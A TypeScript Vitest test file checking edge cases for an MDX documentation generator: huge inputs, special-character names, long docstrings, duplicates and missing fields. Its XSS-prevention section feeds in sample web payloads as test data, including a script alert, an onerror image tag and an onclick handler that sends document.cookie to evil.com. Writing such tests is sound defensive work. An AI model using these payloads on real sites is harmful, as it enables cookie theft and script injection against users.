/**
 * Edge case tests for transformToMDX — stress-tests boundary conditions,
 * special characters, large inputs, and malformed data.
 */
import { describe, it, expect } from 'vitest';
import {
  transformToMDX,
  type ASTModule,
  type ASTClass,
  type ASTFunction,
} from '../core/mdx-generator';

// ─── Large input: 1000+ classes ──────────────────────────────────────────────

describe('large input: module with 1000+ classes', () => {
  it('handles a module with 1000 classes without error', () => {
    const classes: ASTClass[] = [];
    for (let i = 0; i < 1000; i++) {
      classes.push({ name: `Class${i}`, docstring: `Class number ${i}.` });
    }
    const modules: ASTModule[] = [{
      name: 'huge_module',
      docstring: 'A module with many classes.',
      classes,
    }];

    const output = transformToMDX(modules, { outputDir: 'api/py', language: 'python' });
    expect(output.pages).toHaveLength(1001); // module + 1000 classes
    expect(output.sidebar.items).toHaveLength(1); // only one module sidebar item

    // Verify first, middle, and last class pages exist
    expect(output.pages.some((p) => p.path === 'api/py/huge_module.class0.mdx')).toBe(true);
    expect(output.pages.some((p) => p.path === 'api/py/huge_module.class500.mdx')).toBe(true);
    expect(output.pages.some((p) => p.path === 'api/py/huge_module.class999.mdx')).toBe(true);
  });

  it('handles a module with 1000 functions', () => {
    const functions: ASTFunction[] = Array.from({ length: 1000 }, (_, i) => ({
      name: `func${i}`,
      docstring: `Function ${i}.`,
    }));
    const modules: ASTModule[] = [{
      name: 'huge_funcs',
      functions,
    }];

    const output = transformToMDX(modules, { outputDir: 'api/py' });
    expect(output.pages).toHaveLength(1001);
  });
});

// ─── Special characters in names ─────────────────────────────────────────────

describe('special characters in names', () => {
  it('handles dollar sign in module name', () => {
    const modules: ASTModule[] = [
      { name: '$special', docstring: 'Dollar module.' },
    ];
    const output = transformToMDX(modules, { outputDir: 'api/py' });
    expect(output.pages).toHaveLength(1);
    expect(output.pages[0]!.path).not.toContain('$');
  });

  it('handles at-sign in module name', () => {
    const modules: ASTModule[] = [
      { name: '@decorators', docstring: 'At module.' },
    ];
    const output = transformToMDX(modules, { outputDir: 'api/py' });
    expect(output.pages[0]!.path).not.toContain('@');
  });

  it('handles hash in module name', () => {
    const modules: ASTModule[] = [
      { name: '#hashtag', docstring: 'Hash module.' },
    ];
    const output = transformToMDX(modules, { outputDir: 'api/py' });
    expect(output.pages[0]!.path).not.toContain('#');
  });

  it('handles spaces in module name', () => {
    const modules: ASTModule[] = [
      { name: 'my module name', docstring: 'Spaced.' },
    ];
    const output = transformToMDX(modules, { outputDir: 'api/py' });
    expect(output.pages[0]!.path).not.toMatch(/\s/);
  });

  it('handles Japanese characters in module name', () => {
    const modules: ASTModule[] = [
      { name: 'モジュール', docstring: 'Japanese module.' },
    ];
    const output = transformToMDX(modules, { outputDir: 'api/py' });
    expect(output.pages[0]!.frontmatter.title).toBe('モジュール');
  });


  it('handles emoji in class name', () => {
    const modules: ASTModule[] = [{
      name: 'emoji',
      classes: [{ name: '🎉Party', docstring: 'Party class.' }],
    }];
    const output = transformToMDX(modules, { outputDir: 'api/py' });
    const clsPage = output.pages.find((p) => p.path.startsWith('api/py/emoji.'));
    expect(clsPage).toBeDefined();
  });

  it('handles mixed special characters in class and function names', () => {
    const modules: ASTModule[] = [{
      name: 'mixed',
      classes: [{ name: '$pecial_Class', docstring: 'Special.' }],
      functions: [{ name: '@decorated_func', docstring: 'Decorated.' }],
    }];
    const output = transformToMDX(modules, { outputDir: 'api/py' });
    expect(output.pages).toHaveLength(3);
    for (const page of output.pages) {
      expect(typeof page.frontmatter.title).toBe('string');
      expect(typeof page.body).toBe('string');
    }
  });
});

// ─── Docstring with HTML/JSX/XML content ─────────────────────────────────────

describe('docstring with HTML/JSX/XML (XSS prevention)', () => {
  const xssDocstrings = [
    '<script>alert("xss")</script>',
    '<iframe src="https://evil.com"></iframe>',
    '<img src=x onerror=alert(1)>',
    '<div onclick="fetch(\'https://evil.com/cookie?\'+document.cookie)">click</div>',
    '```js\nconsole.log("xss")\n```',
    '<?php echo "xss"; ?>',
    '<%= some_template %>',
  ];

  for (const xss of xssDocstrings) {
    it(`preserves docstring with HTML content: ${xss.slice(0, 40)}...`, () => {
      const modules: ASTModule[] = [{
        name: 'safe_mod',
        docstring: xss,
        classes: [{ name: 'SafeClass', docstring: xss }],
        functions: [{ name: 'safe_fn', docstring: xss }],
      }];
      const output = transformToMDX(modules, { outputDir: 'api/py' });
      expect(output.pages).toHaveLength(3);
      for (const page of output.pages) {
        const firstLine = xss.split('\n')[0]!;
        if (page.frontmatter.description === firstLine) {
          expect(page.body).toContain(xss);
        }
      }
    });
  }
});


// ─── Extremely long docstrings ───────────────────────────────────────────────

describe('extremely long docstrings (10K+ chars)', () => {
  it('handles a 10,000-character docstring', () => {
    const longDoc = 'A'.repeat(10_000);
    const modules: ASTModule[] = [{
      name: 'long_doc_mod',
      docstring: longDoc,
      classes: [{ name: 'LongDocClass', docstring: longDoc }],
    }];
    const output = transformToMDX(modules, { outputDir: 'api/py' });
    expect(output.pages).toHaveLength(2);

    const modPage = output.pages.find((p) => p.path === 'api/py/long_doc_mod.mdx')!;
    expect(modPage.frontmatter.description).toHaveLength(10_000);
    expect(modPage.body).toContain(longDoc);

    const clsPage = output.pages.find((p) => p.path.startsWith('api/py/long_doc_mod.longdocclass'))!;
    expect(clsPage.frontmatter.description).toHaveLength(10_000);
  });

  it('handles a 50,000-character docstring', () => {
    const longDoc = 'B'.repeat(50_000);
    const modules: ASTModule[] = [{
      name: 'very_long',
      docstring: longDoc,
    }];
    const output = transformToMDX(modules, { outputDir: 'api/py' });
    expect(output.pages).toHaveLength(1);
    expect(output.pages[0]!.frontmatter.description).toHaveLength(50_000);
  });

  it('handles a docstring with 1000 newlines', () => {
    const manyLines = Array.from({ length: 1000 }, (_, i) => `Line ${i}`).join('\n');
    const modules: ASTModule[] = [{
      name: 'multi_line',
      docstring: manyLines,
    }];
    const output = transformToMDX(modules, { outputDir: 'api/py' });
    // description should be the first line only
    expect(output.pages[0]!.frontmatter.description).toBe('Line 0');
    // body should contain all lines
    expect(output.pages[0]!.body).toContain('Line 999');
  });
});

// ─── Duplicate class names ───────────────────────────────────────────────────

describe('duplicate class names within a module', () => {
  it('handles duplicate class names (they produce separate pages)', () => {
    const modules: ASTModule[] = [{
      name: 'dup_mod',
      classes: [
        { name: 'Duplicate', docstring: 'First.' },
        { name: 'Duplicate', docstring: 'Second.' },
      ],
    }];
    const output = transformToMDX(modules, { outputDir: 'api/py' });
    // Both classes should generate pages, even with same name
    expect(output.pages).toHaveLength(3); // module + 2 classes
    const classPages = output.pages.filter((p) => p.path.startsWith('api/py/dup_mod.duplicate'));
    expect(classPages).toHaveLength(2);
  });

  it('handles duplicate function names within a module', () => {
    const modules: ASTModule[] = [{
      name: 'dup_fn',
      functions: [
        { name: 'doStuff', docstring: 'First version.' },
        { name: 'doStuff', docstring: 'Second version.' },
      ],
    }];
    const output = transformToMDX(modules, { outputDir: 'api/py' });
    expect(output.pages).toHaveLength(3);
  });
});

// ─── Deeply nested class hierarchies ─────────────────────────────────────────

describe('deeply nested class hierarchies (10+ levels)', () => {
  it('class with 10-level nested methods', () => {
    const modules: ASTModule[] = [{
      name: 'nested',
      classes: [{
        name: 'Deep',
        methods: Array.from({ length: 10 }, (_, index) => ({
          name: `level${index}`,
          signature: `level${index}(): void`,
        })),
      }],
    }];
    const output = transformToMDX(modules, { outputDir: 'api/py' });
    expect(output.pages).toHaveLength(2);
    expect(output.pages[1]!.body).toContain('level9');
  });
});

// ─── Circular references ─────────────────────────────────────────────────────

describe('circular references in AST data', () => {
  it('handles a class that references itself in return types', () => {
    const modules: ASTModule[] = [{
      name: 'circular',
      classes: [{
        name: 'Node',
        docstring: 'A self-referencing tree node.',
        methods: [{
          name: 'getParent',
          signature: 'getParent() -> Node',
          docstring: 'Returns the parent node.',
          return_type: 'Node', // self-referencing
        }, {
          name: 'getChildren',
          signature: 'getChildren() -> list[Node]',
          docstring: 'Returns child nodes.',
          return_type: 'list[Node]', // self-referencing via list
        }],
      }],
    }];
    const output = transformToMDX(modules, { outputDir: 'api/py' });
    expect(output.pages).toHaveLength(2);
    const clsPage = output.pages.find((p) => p.path.startsWith('api/py/circular.node'))!;
    expect(clsPage.body).toContain('Node');
    expect(clsPage.body).toContain('getParent');
    expect(clsPage.body).toContain('getChildren');
  });
});

// ─── Missing / undefined / null fields ───────────────────────────────────────

describe('missing, undefined, and null fields', () => {
  it('handles module with no properties at all', () => {
    const mod = {} as ASTModule;
    const output = transformToMDX([mod], { outputDir: 'api/py' });
    expect(output.pages).toHaveLength(1);
    expect(output.pages[0]!.frontmatter).toHaveProperty('title');
  });

  it('handles module with name but nothing else', () => {
    const modules: ASTModule[] = [{ name: 'sparse' }];
    const output = transformToMDX(modules, { outputDir: 'api/py' });
    expect(output.pages).toHaveLength(1);
    expect(output.pages[0]!.frontmatter.title).toBe('sparse');
    expect(typeof output.pages[0]!.frontmatter.description).toBe('string');
  });

  it('handles class with no methods or properties', () => {
    const modules: ASTModule[] = [{
      name: 'bare',
      classes: [{ name: 'EmptyClass' }],
    }];
    const output = transformToMDX(modules, { outputDir: 'api/py' });
    expect(output.pages).toHaveLength(2);
    const clsPage = output.pages.find((p) => p.path.startsWith('api/py/bare.emptyclass'))!;
    expect(clsPage.frontmatter.title).toBe('bare.EmptyClass');
  });

  it('handles function with no parameters or return type', () => {
    const modules: ASTModule[] = [{
      name: 'simple',
      functions: [{ name: 'doSomething' }],
    }];
    const output = transformToMDX(modules, { outputDir: 'api/py' });
    expect(output.pages).toHaveLength(2);
    const fnPage = output.pages.find((p) => p.path.startsWith('api/py/simple.dosomething'))!;
    expect(fnPage.frontmatter.title).toBe('simple.doSomething');
  });

  it('handles empty string for all string fields', () => {
    const modules: ASTModule[] = [{
      name: '',
      docstring: '',
      classes: [{ name: '', docstring: '', methods: [{ name: '', signature: '', docstring: '' }] }],
      functions: [{ name: '', docstring: '' }],
    }];
    const output = transformToMDX(modules, { outputDir: 'api/py' });
    // Even with empty names, pages should be generated
    expect(output.pages.length).toBeGreaterThan(0);
    for (const page of output.pages) {
      expect(typeof page.frontmatter.title).toBe('string');
      expect(typeof page.body).toBe('string');
    }
  });
});

// ─── Boundary: negative or extreme values ────────────────────────────────────

describe('boundary values for numeric fields', () => {
  it('handles very large numbers as string values', () => {
    const modules: ASTModule[] = [{
      name: 'big_num',
      functions: [{
        name: 'big',
        signature: 'big(x: number) -> number',
        parameters: [{ name: 'x', type: 'number', default: '999999999999999999999999999999' }],
        return_type: 'number',
      }],
    }];
    const output = transformToMDX(modules, { outputDir: 'api/py' });
    expect(output.pages).toHaveLength(2);
    expect(output.pages[1]!.body).toContain('999999999999999999999999999999');
  });
});
